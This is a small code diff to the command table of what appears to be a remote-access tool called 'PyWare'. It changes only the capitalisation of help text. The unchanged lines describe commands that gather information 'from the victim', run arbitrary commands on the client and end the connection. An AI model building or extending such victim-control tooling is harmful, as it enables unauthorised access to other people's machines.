@@ -154,13 +154,13 @@ class Commands:
                                                          "Close connection and exit this prompt."
                                                          " PyWare on client is kill."),
                                    "help": command_tuple(lambda arg="": self.help(arg),
-                                                         "help [command]",
+                                                         "help [Command]",
                                                          "Print this help."),
                                    "list": command_tuple(lambda: self.list(),
                                                          "list",
                                                          "List command available."),
                                    "getinfo": command_tuple(lambda arg="": self.getinfo(arg),
-                                                            "getinfo [options,]",
+                                                            "getinfo [Options,]",
                                                             "Get information from the victim. Options available : "
                                                             "user, hostname, fqdn, ip, os, version, architecture, "
                                                             "language, time"),
@@ -172,7 +172,7 @@ class Commands:
                                                             "newkeys",
                                                             "Generate and use a new session key."),
                                    "exec": command_tuple(lambda arg="": self.exec(arg),
-                                                         "exec command",
+                                                         "exec Command",
                                                          "Execute a command on the client and print result."
                                                          " Warning, it is an integrative mode."),
                                    "getusers": command_tuple(lambda: self.getusers(),
